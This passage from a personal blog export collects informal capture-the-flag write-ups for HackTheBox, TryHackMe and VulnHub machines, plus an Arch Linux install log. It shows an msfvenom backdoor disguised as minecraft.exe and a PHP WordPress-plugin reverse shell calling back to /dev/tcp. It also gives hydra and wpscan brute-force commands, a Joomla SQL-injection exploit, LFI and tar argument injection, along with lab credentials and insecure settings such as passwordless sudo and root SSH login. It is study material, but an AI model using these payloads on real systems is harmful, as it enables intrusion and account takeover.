SMB:> mget * Mount it: mkdir /mnt/ctf mount -t cifs //10.10.10.192/profiles$ /mnt/ctf Exect an exe file on linuxWith nono or wine64. I don’t know nono.I don’t care about this step let’s continue. LDAP EnumerationHe use ldapsearch but he only give one exemple so I’m searching somewhere else.https://devconnected.com/how-to-search-ldap-using-ldapsearch-examples/I will install it: sudo pacman -S openldap https://wiki.archlinux.org/title/OpenLDAPhttps://access.redhat.com/documentation/en-us/red_hat_directory_server/11/html/administration_guide/examples-of-common-ldapsearcheshttps://0xdf.gitlab.io/tags#ldapsearchExemples ldapsearch -H ldap://blackfield.local:389 -x -b DC=blackfield,DC=LOCAL ldapsearch -h support.htb -x -s base namingcontexts ldapsearch -h support.htb -x -b \"DC=support,DC=htb\" ldapsearch -h support.htb -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b \"DC=support,DC=htb\"| less # Without auth ldapsearch -h 10.10.11.168 -x -s base namingcontexts # With auth ldapsearch -h 10.10.11.129 -D 'hope.sharp@search.htb' -w \"IsolationIsKey?\" -b \"DC=search,DC=htb\" # I don't understand this one ldapsearch -h 127.0.0.1 -x -b 'dc=htb' -D 'cn=binduser,ou=users,dc=pikaboo,dc=htb' -w 'J~42%W?PFHl]g' crackmapexecCrackMapExec shows the full OS information: oxdf@parrot$ crackmapexec smb 10.10.10.248 SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) So, if the dig is not working you can use this, I think you should use both.You can also see if the SMBv1 is enabled. smbmapI don’t see the difference with smbclient Backdoorhttps://www.youtube.com/watch?v=Nt0CE3Km8NwTargert = 192.168.5.115me = 192.168.5.128 msfvenom -p windowd/meterpreter/reverse-tcp LHOST=$me LPORT=$myport -f exe > minecraft.exe So, if you can upload something you can upload a backdoor. rpcclientit’s the RDP Connectrpcclient -U '' -N $IP Enum usersenumdomusers Clear the output: cat users.txt | awk -F\\[ '&#123;print $2&#125;' | awk -F \\] '&#123;print $1&#125;' > valid_users.txt Then in the CTF he use ldpsearch to find the password, decode it. crackmapexecThen he use the list of users to brute force the smb with the valid password and the tool crackmapexec.I need it. yay -S crackmapexec wow, only for one tool… Ok… I will install it later.later: yay -S crackmapexec --overwrite '*' Then he brute force.https://cheatsheet.haax.fr/windows-systems/exploitation/crackmapexec/ SharpHoundIt’s used to enum for privesc","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Relevant","slug":"CTF Relevant","date":"2023-01-13T17:18:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF Relevant.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Relevant.html","excerpt":"","text":"Ping ttl=127, it’s windows rustscanrustscan -a 10.10.177.26 --ulimit 5000 I have to use nmap with the flag -sV. nmapnmap -A -sC -sV -p- -script=vuln 10.10.177.26 Starting Nmap 7.93 ( https:&#x2F;&#x2F;nmap.org ) at 2023-01-13 11:30 CET Pre-scan script results: | broadcast-avahi-dos: | Discovered hosts: | 224.0.0.251 | After NULL UDP avahi packet DoS (CVE-2011-1002). |_ Hosts are all up (not vulnerable). Not shown: 65528 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80&#x2F;tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS&#x2F;10.0 |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. 135&#x2F;tcp open msrpc Microsoft Windows RPC 139&#x2F;tcp open netbios-ssn Microsoft Windows netbios-ssn 3389&#x2F;tcp open ms-wbt-server Microsoft Terminal Services 49663&#x2F;tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS&#x2F;10.0 |_http-dombased-xss: Couldn&#39;t find any DOM based XSS. |_http-csrf: Couldn&#39;t find any CSRF vulnerabilities. |_http-stored-xss: Couldn&#39;t find any stored XSS vulnerabilities. 49667&#x2F;tcp open msrpc Microsoft Windows RPC 49669&#x2F;tcp open msrpc Microsoft Windows RPC Service Info: OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows Host script results: |_smb-vuln-ms10-054: false |_samba-vuln-cve-2012-1182: SMB: Couldn&#39;t find a NetBIOS name that works for the server. Sorry! |_smb-vuln-ms10-061: SMB: Couldn&#39;t find a NetBIOS name that works for the server. Sorry! | smb-vuln-cve2009-3103: | VULNERABLE: | SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497) | State: VULNERABLE | IDs: CVE:CVE-2009-3103 | Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2, | Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a | denial of service (system crash) via an &amp; (ampersand) character in a Process ID High header field in a NEGOTIATE | PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location, | aka &quot;SMBv2 Negotiation Vulnerability.&quot; | | Disclosure date: 2009-09-08 | References: | https:&#x2F;&#x2F;cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2009-3103 |_ http:&#x2F;&#x2F;www.cve.mitre.org&#x2F;cgi-bin&#x2F;cvename.cgi?name&#x3D;CVE-2009-3103 Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; . Nmap done: 1 IP address (1 host up) scanned in 697.34 seconds","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"CTF Ted","slug":"CTF Ted","date":"2023-01-13T17:18:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF Ted.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Ted.html","excerpt":"","text":"CTF TedCTF Linux Created At : 2021-08-08 04:15 Count:171 Views 👀 :2224 DiscoveryLet’s read the infos.https://www.vulnhub.com/entry/ted-1,327/ How well do you understand PHP programs?How familiar are you with Linux misconfigurations?This image will cover advanced Web attacks, out of the box thinking and the latest security vulnerabilities. Please note that this is capture the flag machine which means it is not real life scenariobut will challenge you hard before you can obtain root privileges. Scanningnetdiscoversudo netdiscover 192.168.0.0/16 nmapsudo nmap -sV -p- 192.168.0.31 Only the port 80 is open. This is what we have: I found nothing with dirbuster and nikto.let’s try with Burpsuit. burpsuitI intercept the traffic and open the Browser.Request: He talked about missconfiguration, let’s try some creds like admin, user, root, toor, etc… Here we go!I think I found the password, now I need the username. I saw 2 differents response: Password or password hash is not correct, make sure to hash it before submit. Username is not correct. User=toor","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[]},{"title":"Bypass yt restriction","slug":"Bypass yt restriction","date":"2023-01-13T04:25:00.000Z","updated":"2023-04-12T14:14:27.244Z","comments":true,"path":"/post/Bypass yt restriction.html","link":"","permalink":"https://peanutstick.github.io/post/Bypass%20yt%20restriction.html","excerpt":"","text":"DISPLAY=:0 mpv https://www.youtube.com/watch?v=50nlHgRYp1I --slang=en --fs --ytdl-raw-options=ignore-config=,sub-lang=en,write-auto-sub=","categories":[{"name":"Tips","slug":"Tips","permalink":"https://peanutstick.github.io/categories/Tips/"}],"tags":[{"name":"Youtube","slug":"Youtube","permalink":"https://peanutstick.github.io/tags/Youtube/"}]},{"title":"CTF Daily Bugle","slug":"CTF Daily Bugle","date":"2023-01-13T01:20:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF Daily Bugle.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Daily%20Bugle.html","excerpt":"","text":"rustscanrustscan -a 10.10.56.151 --ulimit 5000 robots.txthttp://10.10.56.151/robots.txt User-agent: * Disallow: &#x2F;administrator&#x2F; Disallow: &#x2F;bin&#x2F; Disallow: &#x2F;cache&#x2F; Disallow: &#x2F;cli&#x2F; Disallow: &#x2F;components&#x2F; Disallow: &#x2F;includes&#x2F; Disallow: &#x2F;installation&#x2F; Disallow: &#x2F;language&#x2F; Disallow: &#x2F;layouts&#x2F; Disallow: &#x2F;libraries&#x2F; Disallow: &#x2F;logs&#x2F; Disallow: &#x2F;modules&#x2F; Disallow: &#x2F;plugins&#x2F; Disallow: &#x2F;tmp&#x2F; jumla http://10.10.56.151//htaccess.txt we are in 2023, there is few CVE here. https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html http://10.10.56.151/index.php?option=com_fields&amp;view=fields&amp;layout=modal sqlihttps://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py Found user [&#39;811&#39;, &#39;Super User&#39;, &#39;jonah&#39;, &#39;jonah@tryhackme.com&#39;, &#39;$2y$10$0veO&#x2F;JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;, &#39;&#39;, &#39;&#39;] Crack the hashhashcat -m 3200 hash /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt Output: $2y$10$0veO&#x2F;JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123 jonah:spiderman123 revershellhttps://www.hackingarticles.in/joomla-reverse-shell/in error.phpthen10.10.56.151/index.php/zefzef lse polkit","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://peanutstick.github.io/tags/CMS/"}]},{"title":"CTF Daily Bugle","slug":"CTF Internal","date":"2023-01-12T01:20:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF Internal.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Internal.html","excerpt":"","text":"rustscanrustscan -a 10.10.155.73 --ulimit 5000 GObustergobuster dir -u http://10.10.155.73/ -x txt,html,php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /etc/hosts10.10.155.73 internal.thm http://internal.thm/blog/ Wordpress wpscan --url http://internal.thm/blog --enumerate u WordPress version 5.4.2 bruteforcewpscan -v -U admin -P Documents/arch_doc/CTF/Wordlist/rockyou.txt --url http://internal.thm/blog/wp-login.php Useless Reversehellvia error 404 of template LSE Polkit CVE, no need to think, let’s pwn it. Plokithttps://github.com/joeammond/CVE-2021-4034 I’m root ConclusionThis box was “hard” but still easier than easy box of HTB.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://peanutstick.github.io/tags/CMS/"}]},{"title":"CTF Mr Robot","slug":"CTF Mr Robot","date":"2023-01-09T08:51:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF Mr Robot.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Mr%20Robot.html","excerpt":"","text":"nmapClosed but it’s ok, THM take lot of time to load Gobuster wordpress loginhttp://10.10.185.72/wp-login.php robots.txt So… Wordpress Find the userhydra -L fsocity.dic -p admin 10.10.185.72 -V http-form-post \"/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2F10.10.185.72%2Fwp-admin%2F&amp;testcookie=1:F=Invalid username.\" Find the passwordwpscan -v -U user.txt -P fsocity.dic.sort --url http:&#x2F;&#x2F;10.10.185.72&#x2F;wp-login.php Revershell zip it, send it, listen and activate. Robot md5 rootlse.shlse.sh is in my current directory. /usr/local/bin/nmap nmap exploithttps://gtfobins.github.io/gtfobins/nmap/","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"CMS","slug":"CMS","permalink":"https://peanutstick.github.io/tags/CMS/"}]},{"title":"CTF SecretRezip","slug":"CTF SecretRezip","date":"2022-11-11T02:25:00.000Z","updated":"2023-04-12T14:14:27.267Z","comments":true,"path":"/post/CTF SecretRezip.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20SecretRezip.html","excerpt":"","text":"Understand it grep --color=auto -rnw '.' -ie \"HTB\" --color=always 2> /dev/null So we are exporting 2 variables, The flag and the PasswordIt will be too hard to find the password, and he change every time.I’m searching for an another file. grep --color=auto -rnw '.' -ie \"FLAG\" --color=always 2> /dev/null ./src/src/routes.js Zip structureThe ingredients in the web page in in fact the flag, the flag should start with Secret HTB&#123; .There is no encryption. Signature:The signature of the local file header. This is always ‘\\x50\\x4b\\x03\\x04’.Compression method:00: no compression And this is what I have if I enter nohing in the ingredinents field: Iv’e downloaded multiple files with different Ingredients:https://i.imgur.com/y05ptiD.png So I will try Secret: H, Secret: HT and Secret: HTBSecret: H: Secret: HT Secret: HTB 3C is everywhere, let’s do a misstake.Secret: HTC Now we have 3D, instead of 3CI will now find a way to get this value only. xxd Secret:\\ HTB.zip |awk '&#123;print $3&#125;'| sed -n 2p Download via bash Copy as curl commandand add -O for output: curl 'http://167.71.131.210:31269/ingredients' -X POST -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:106.0) Gecko/20100101 Firefox/106.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Content-Type: application/json' -H 'Origin: http://167.71.131.210:31269' -H 'Connection: keep-alive' -H 'Referer: http://167.71.131.210:31269/' --data-raw '&#123;\"ingredients\":\"dfgdfg\"&#125;' -O Script itI will try something like this: not 3200 but 3c00. Download it Check it Generate chars I have to set the i at 21 because there is no chars beffor. Try the charLet’s try it and guess the first next char only. Let’s try it: Finish the scriptThe else is useless, I will remove the echo too.I just keep the echo at line 17 to show the response.Line 16 I add the good char to the string. And voila","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://peanutstick.github.io/tags/pwn/"}]},{"title":"CTF Hackfest 2016","slug":"CTF Hackfest 2016","date":"2022-10-27T02:21:00.000Z","updated":"2023-04-12T14:14:27.261Z","comments":true,"path":"/post/CTF Hackfest 2016.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Hackfest%202016.html","excerpt":"","text":"netdiscover 192.168.0.24 nmaprustscan -sV -p- 192.168.0.24 Output: PORT STATE SERVICE VERSION 22&#x2F;tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0) 53&#x2F;tcp open domain ISC BIND 9.8.1-P1 80&#x2F;tcp open http Apache httpd 2.2.22 ((Ubuntu)) 110&#x2F;tcp open pop3? 139&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 143&#x2F;tcp open imap Dovecot imapd 445&#x2F;tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 993&#x2F;tcp open ssl&#x2F;imap Dovecot imapd 995&#x2F;tcp open ssl&#x2F;pop3s? Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Port 80http://192.168.0.24/robots.txt Disallow: Hackers Allow: &#x2F;wordpress&#x2F; ____ # &#x2F;___ \\_ _ __ _ ___ __ _ _ __ # &#x2F;&#x2F; &#x2F; &#x2F; | | |&#x2F; _&#96; |&#x2F; _ \\ &#x2F; _&#96; | &#39;__| #&#x2F; \\_&#x2F; &#x2F;| |_| | (_| | (_) | (_| | | #\\___,_\\ \\__,_|\\__,_|\\___&#x2F; \\__,_|_| http://192.168.0.24/wordpress/ wpscan --url http://192.168.0.24/wordpress/ --enumerate u Version: Server: Apache&#x2F;2.2.22 (Ubuntu) X-Powered-By: PHP&#x2F;5.3.10-1ubuntu3 Users: wpuser admin:admin http://192.168.0.24/upload/We found the creds, admin:admin.Let’s upload a revers shell. &lt;?php /** * Plugin Name: Reverse Shell Plugin * Plugin URI: * Description: Reverse Shell Plugin * Version: 1.0 * Author: Vince Matteo * Author URI: http://peanutstick.githubio.com */ exec(\"/bin/bash -c 'bash -i >&amp; /dev/tcp/192.168.0.25/4848 0>&amp;1'\"); ?> Listen: nc -nlvp 4848 lse.sh Oh no no no. [!] ret060 Can we write to executable paths present in cron jobs........... yes! --- &#x2F;etc&#x2F;cron.d&#x2F;php5:09,39 * * * * root [ -x &#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime ] &amp;&amp; [ -d &#x2F;var&#x2F;lib&#x2F;php5 ] &amp;&amp; find &#x2F;var&#x2F;lib&#x2F;php5&#x2F; -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(&#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;&#x2F;dev&#x2F;null \\; -delete &#x2F;etc&#x2F;cron.d&#x2F;php5:09,39 * * * * root [ -x &#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime ] &amp;&amp; [ -d &#x2F;var&#x2F;lib&#x2F;php5 ] &amp;&amp; find &#x2F;var&#x2F;lib&#x2F;php5&#x2F; -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(&#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;&#x2F;dev&#x2F;null \\; -delete --- Modify: 09,39 * * * * root [ -x &#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime ] &amp;&amp; [ -d &#x2F;var&#x2F;lib&#x2F;php5 ] &amp;&amp; find &#x2F;var&#x2F;lib&#x2F;php5&#x2F; -depth -mindepth 1 -maxdepth 1 -type f -cmin +$(&#x2F;usr&#x2F;lib&#x2F;php5&#x2F;maxlifetime) ! -execdir fuser -s &#123;&#125; 2&gt;&#x2F;dev&#x2F;null \\; -delete hydra -L user.txt -P pass.txt 192.168.0.24 -V http-form-post “/wordpress/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirect_to=%2Fwordpress%2Fwp-admin%2F&amp;testcookie=1:F=&lt;form name=’loginform’”","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"cms","slug":"cms","permalink":"https://peanutstick.github.io/tags/cms/"}]},{"title":"CTF Micro Storage","slug":"CTF Micro Storage","date":"2022-10-17T04:25:00.000Z","updated":"2023-04-12T14:14:27.264Z","comments":true,"path":"/post/CTF Micro Storage.html","link":"","permalink":"https://peanutstick.github.io/post/CTF%20Micro%20Storage.html","excerpt":"","text":"CTF Micro Storage Form HTBWe just have the IP address and the port, we have to use netcat to connect. nc $ip $port We have 6 option, it’s a script who ask us what we want to do.This user recommand us to figure out which commands are executed for each option. Options1 UploadWe have enter the name of the file, can’t excape with &gt;,|,&amp;,;,} and more.Then we have to write the text and exit with EOF (End Of File).Linit of 10 files, I should try to explose it. 2 List my uploadIt’s using ls, maybe. 3 Delete a filerm 4 PrintIt’s a cat or echo. 5 Compress &amp; DownloadThis one look more interesting.On the server: On my computer: So they are using the command tar -cf and they encode it in base64. Exploithttps://gtfobins.github.io/gtfobins/tar/ I can add arguments when I create the file, the title of the file will be the argument.I’m creating 3 files, 2 for the arguments because he don’t like spaces and one for the script. Then generate it twice.","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://peanutstick.github.io/tags/pwn/"}]},{"title":"CTF Micro Storage","slug":"Eternal Loop","date":"2022-09-26T08:15:00.000Z","updated":"2023-04-12T14:14:27.271Z","comments":true,"path":"/post/Eternal Loop.html","link":"","permalink":"https://peanutstick.github.io/post/Eternal%20Loop.html","excerpt":"","text":"The passwordI have a zip file but I don’t have the password, I have to find it. The password is the numbers in the next file, so the password for 37366 is 5900.I can extract the password like this: Loop to extractI will create a loop too extract the file, because there is a .zip into a .zip, I can’t do it manualy. #!/bin/bash current_file=\"37366.zip\" while true; do password=$(strings $current_file |tail -1 | cut -d '.' -f1) unzip -P $password $current_file current_file=$password\".zip\" echo \"$current_file\" >> track.txt done In the file track.txt I have the list of the names of the files, I’m using this file to know wish file is the last one.The last file is 6969.zip and there is a file called DoNotTouch.zip.I don’t have the password for this one, I have to crack it.I have to put rockyou in my directory. fcrackzip -u -D -p rockyou.txt 6969.zip Output: PASSWORD FOUND!!!!: pw &#x3D;&#x3D; letmeinplease Open the last zip fileunzip -P letmeinplease 6969.zip Now we have the file DoNotTouch. file DoNotTouch Output: DoNotTouch: SQLite 3.x database, last written using SQLite version 3021000, page size 1024, file counter 26, database pages 864, cookie 0x22, schema 1, UTF-8, version-valid-for 26 SQL file, I will use strings :). strings DoNotTouch|grep HTB Output: 1969-01-01 00:00:002069-01-01 00:00:00Chillin with SatanHellHTB&#123;z1p_and_unz1p_ma_bruddahs&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://peanutstick.github.io/categories/CTF/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://peanutstick.github.io/tags/pwn/"}]},{"title":"Fresh install of Arch","slug":"Fresh install of Arch","date":"2022-07-10T01:30:00.000Z","updated":"2023-04-12T15:10:22.386Z","comments":true,"path":"/post/Fresh install of Arch.html","link":"","permalink":"https://peanutstick.github.io/post/Fresh%20install%20of%20Arch.html","excerpt":"","text":"WhyI would like to reinstall Arch because I have few problems: I can’t use the FN key to manage the brightness. My screen is blinking in really fast sometimes. I have too many partitions. Polybar don’t start at every startup. Wine doesn’t work fine with fewer games. Plus: I have it for one year. I have 1770 packages, Few kernels it will take too much time to fix it. HowPartitionsI will use fillezilla to transfer the files to an another computer. And compress them. As you can see it’s a bit messy.I will use LVM to manage the space.I don’t use only one partion for one disk because I like to see where it’s full or not with df. DEI won’t use xfce anymore, I don’t want to use xrandr, I need something grphical for my screen. It’s cool to use the terminal but sometimes I just wan’t someting easy to use. Maybe there is something opensource to do it. So no DE, only WM.bspwm. Wayland VS Xorghttps://linuxcool.net/en/reviews/laptops-last-longer-with-wayland-than-with-xorg/I’m on laptop, I need more battery life.Wayland is better for that but, it’s still buggy and don’t support bspwm. Xorg win. Apps bspwm sxhkd networkmanager pipewire timeshift polybar lf (ranger like) pcmanfm dragon firefox (because of css) picom ohmyzsh kitty steam / lutris / moonlight virtualbox Pentest tools obsidian obs kitty libre office rofi kdenlive mpv / vlc qBittorent flameshot vim (for coding, fuck VScode) And more dependancies… Let’s goAll my files are saved, I’m booting on the USB stick with the new iso of Arch. PartitionI will store everything in the home directory, it’s not serious to store my files in the /.For my games I will use the hdd because I don’t have lot of space in my nvme| Disk | LV | Nom logique | Usage |Space || :——– |:—————| :——————| :———————— |:———————— ||/dev/nvme0n1| / |base | for the system | 70%FREE||/dev/sda| /timeshift |timeshift | for backups | 100 GB||/dev/sda| /home |home | for home | 100%FREE| echo -e \"d\\nw\\ny\" | fdisk /dev/sda echo -e \"d\\nw\\ny\" | fdisk /dev/nvme0n1 echo -e \"n\\np\\n1\\n\\n\\nw\\ny\" | fdisk /dev/sda echo -e \"n\\np\\n1\\n\\n\\nw\\ny\" | fdisk /dev/nvme0n1 pvcreate /dev/nvme0n1p1 vgcreate NVME /dev/nvme0n1p1 lvcreate --size 500M -n lvefi NVME lvcreate -l +100%FREE -n lvbase NVME mkfs -t ext4 /dev/NVME/lvbase mkfs.fat -F32 /dev/nvme0n1p1 mount /dev/NVME/lvbase /mnt mkdir /mnt/home mkdir /mnt/timeshift mkdir /mnt/boot/efi mount /dev/nvme0n1p1 /mnt/boot/efi pvcreate /dev/sda1 vgcreate HDD /dev/sda1 lvcreate --size 100G -n lvtime HDD lvcreate -l +100%FREE -n lvhdd HDD mkfs -t ext4 /dev/HDD/lvhdd mkfs -t ext4 /dev/HDD/lvtime mount /dev/HDD/lvhdd /mnt/home mount /dev/HDD/lvtime /mnt/timeshift pacstrap /mnt base base-devel linux linux-firmware genfstab -U /mnt >> /mnt/etc/fstab;arch-chroot /mnt bash -c 'pacman -Syu grub sudo efibootmgr networkmanager openssh intel-ucode vim zsh bspwm sxhkd kitty xclip dmenu polybar pipewire pipewire-alsa pipewire-pulse pipewire-jack pavucontrol xorg xorg-xinit xorg-server lightdm-gtk-greeter lightdm firefox; grub-install /dev/sda;grub-mkconfig -o /boot/grub/grub.cfg' arch-chroot /mnt ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime hwclock --systohc en_US.UTF-8 UTF-8 echo \"en_US.UTF-8 UTF-8\" >> /etc/locale.gen locale-gen echo \"LANG=fr_FR.UTF-8\" >> /etc/locale.conf echo \"KEYMAP=fr\" >> /etc/vconsole.conf systemctl enable NetworkManager lightdm mkdir /boot/efi mount /dev/nvme0n1p1 /boot/efi grub-install --target=x86_64-efi --bootloader-id=GRUB --efi-directory=/boot/efi --removable grub-mkconfig -o /boot/grub/grub.cfg passwd vim /etc/sudoers %wheel ALL=(ALL) NOPASSWD: ALL n=\"peanutstick\" echo \"$n\" > /etc/hostname echo \"127.0.0.1 localhost\" >> /etc/hosts echo \"::1 localhost\" >> /etc/hosts echo \"127.0.1.1 \"$n\".localdomain \"$n >> /etc/hosts useradd -m -s /bin/zsh peanutstick usermod -a -G wheel peanutstick passwd peanutstick exit umount -R /mnt reboot ![[Pasted image 20220709185234.png]] sed -i \"s/^#ParallelDownloads = 5$/ParallelDownloads = 15/\" /etc/pacman.conf pacman --noconfirm -Sy archlinux-keyring timedatectl set-ntp true mkfs.ext4 /dev/nvme0n1p4 mount /dev/nvme0n1p4 /mnt pacstrap /mnt base base-devel linux linux-firmware genfstab -U /mnt >> /mnt/etc/fstab arch-chroot /mnt sed -i \"s/^#ParallelDownloads = 5$/ParallelDownloads = 15/\" /etc/pacman.confln -sf /usr/share ln -sf /usr/share/zoneinfo/Europe/Paris /etc/localtime hwclock --systohc echo \"en_US.UTF-8 UTF-8\" >> /etc/locale.gen locale-gen echo \"LANG=en_US.UTF-8\" > /etc/locale.conf echo \"KEYMAP=fr\" > /etc/vconsole.conf echo \"peanutstick\" > /etc/hostname echo \"127.0.0.1 localhost\" >> /etc/hosts echo \"::1 localhost\" >> /etc/hosts echo \"127.0.1.1 peanutstick.localdomain peanutstick\" >> /etc/hosts mkinitcpio -P pacman --noconfirm -S networkmanager grub openssh vim G efibootmgr os-prober systemctl enable NetworkManager sshd echo \"PermitRootLogin yes\" >> /etc/ssh/sshd_config passwd Then I reboot to see if my other arch can see him. I can see it, I add it to my grub menu.Now I can boot directly on Arch n°2. Connect to wifinmcli radio wifi on nmcli dev wifi list sudo nmcli dev wifi connect network-ssid password \"network-password\" User + shellpacman -S zsh git sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" vim /etc/sudoers %wheel ALL=(ALL) NOPASSWD: ALL useradd -m peanutstick usermod -a -G wheel peanutstick passwd peanutstick sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\" PartitonI deleted my partition with my games ;( AHHHHHHI still have the one with my movies. sudo mkdir /main sudo mount /dev/nvme0n1p3 /main # My old home I don’t thisk it’s a good idea to use an another drive for the home","categories":[{"name":"OS","slug":"OS","permalink":"https://peanutstick.github.io/categories/OS/"}],"tags":[{"name":"Arch","slug":"Arch","permalink":"https://peanutstick.github.io/tags/Arch/"}]},{"title":"DIGITALWORLD: FALL ","slug":"DIGITALWORLD FALL","date":"2022-07-03T04:30:52.000Z","updated":"2022-09-28T07:36:53.761Z","comments":true,"path":"/post/DIGITALWORLD FALL.html","link":"","permalink":"https://peanutstick.github.io/post/DIGITALWORLD%20FALL.html","excerpt":"","text":"netdiscover192.168.0.24 rustscanrustscan -a 192.168.0.24 --ulimit 10000 The port 80, 443 and 9090 are interesting. Port 9090A login page.Fedora server Port 443 Simple CMS 2.2.15 There is an exploit on this version:https://www.exploit-db.com/exploits/49345 gobustergobuster dir -u http://192.168.0.27 -w Documents/wordlist/directory-list-2.3-medium.txt -x php --wildcard switch Admin login pagehttp://192.168.0.27/admin/login.php Users qiu InfosThey have a problem about a backdoor. LFIhttp://192.168.0.27/test.phphttps://book.hacktricks.xyz/pentesting-web/file-inclusion http://192.168.0.27/test.php?file=/etc/passwd root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash bin:x:1:1:bin:&#x2F;bin:&#x2F;sbin&#x2F;nologin daemon:x:2:2:daemon:&#x2F;sbin:&#x2F;sbin&#x2F;nologin adm:x:3:4:adm:&#x2F;var&#x2F;adm:&#x2F;sbin&#x2F;nologin lp:x:4:7:lp:&#x2F;var&#x2F;spool&#x2F;lpd:&#x2F;sbin&#x2F;nologin sync:x:5:0:sync:&#x2F;sbin:&#x2F;bin&#x2F;sync shutdown:x:6:0:shutdown:&#x2F;sbin:&#x2F;sbin&#x2F;shutdown halt:x:7:0:halt:&#x2F;sbin:&#x2F;sbin&#x2F;halt mail:x:8:12:mail:&#x2F;var&#x2F;spool&#x2F;mail:&#x2F;sbin&#x2F;nologin operator:x:11:0:operator:&#x2F;root:&#x2F;sbin&#x2F;nologin games:x:12:100:games:&#x2F;usr&#x2F;games:&#x2F;sbin&#x2F;nologin ftp:x:14:50:FTP User:&#x2F;var&#x2F;ftp:&#x2F;sbin&#x2F;nologin nobody:x:65534:65534:Kernel Overflow User:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-coredump:x:999:996:systemd Core Dumper:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-network:x:192:192:systemd Network Management:&#x2F;:&#x2F;sbin&#x2F;nologin systemd-resolve:x:193:193:systemd Resolver:&#x2F;:&#x2F;sbin&#x2F;nologin dbus:x:81:81:System message bus:&#x2F;:&#x2F;sbin&#x2F;nologin polkitd:x:998:995:User for 